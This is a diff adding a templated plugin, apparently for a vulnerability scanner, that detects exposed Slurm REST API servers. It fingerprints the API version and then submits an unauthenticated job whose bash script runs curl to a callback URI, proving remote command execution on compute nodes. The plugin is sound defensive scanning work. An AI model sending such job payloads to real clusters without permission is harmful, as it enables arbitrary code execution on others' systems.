@@ -1,0 +1,104 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Slurm_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "lancedD00m for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "Slurm_ExposedUI"
+  }
+  severity: CRITICAL
+  title: "Exposed Slurm REST API Server"
+  description: 
+    "An exposed Slurm REST API server can be exploited by attackers to submit a job"
+    " and therefore execute arbitrary OS-level commands on Slurm compute"
+    " nodes"
+  recommendation:
+    "Set proper authentication for the Slurm Rest API server and "
+    "ensure the API is not publicly exposed through a "
+    "misconfigured reverse proxy."
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_slurm_version"
+  http_request: {
+    method: GET
+    uri: "/openapi/v3"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: '\"\\\\/slurm\\\\/(v0.0.\\d\\d)\\\\/job\\\\/submit\"'
+            variable_name: "SLURM_VERSION"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_command"
+  http_request: {
+    method: POST
+    uri: "/slurm/{{ SLURM_VERSION }}/job/submit"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data:
+      "{"
+      "    \"job\": {"
+      "        \"name\": \"test\","
+      "        \"ntasks\": 1,"
+      "        \"current_working_directory\": \"/tmp\","
+      "        \"environment\": ["
+      "            \"PATH:/bin:/usr/bin/:/usr/local/bin/\","
+      "            \"LD_LIBRARY_PATH:/lib/:/lib64/:/usr/local/lib\""
+      "       ]"
+      "    },"
+      "    \"script\": \"#!/bin/bash\\n curl {{ T_CBS_URI }}\""
+      "}"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1500 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_slurm_version",
+    "execute_command",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
